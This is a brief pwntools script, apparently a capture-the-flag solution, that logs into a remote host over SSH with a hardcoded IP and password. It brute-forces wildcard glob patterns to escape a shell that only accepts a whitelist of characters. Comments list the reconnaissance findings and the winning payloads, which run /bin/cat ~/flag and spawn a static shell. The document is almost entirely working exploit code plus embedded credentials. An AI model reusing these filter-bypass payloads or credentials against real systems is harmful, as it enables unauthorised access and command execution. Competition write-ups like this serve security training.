from pwn import *
from string import printable

s = ssh('pwn2', '54.156.42.26', password='30a7bcc6c18591f0bcb52f554bea11bf')
p = s.shell()
p.recvlines(3)

for i in xrange(0xff):
    payload = '/???/??c%s' % ('?'*(i+1))
    p.sendline(payload)
    print p.recvlines(2)[1], payload
    p.clean()
p.interactive()

# ----gathering----
# c , - / ? \ { }       : whitelist
# /home/pwn2/launch.sh  : Is the program
# /home/pwn2/sub        : Is a directory
# /home/pwn2/flag       : Permission denied
# 
# ----solution----
# -> use pwn1 try to copy /bin/sh file and rename it with 'c'
# -> {/???/c??,~/????} : /bin/cat ~/flag
# -> /???/??????-??    : /bin/static-sh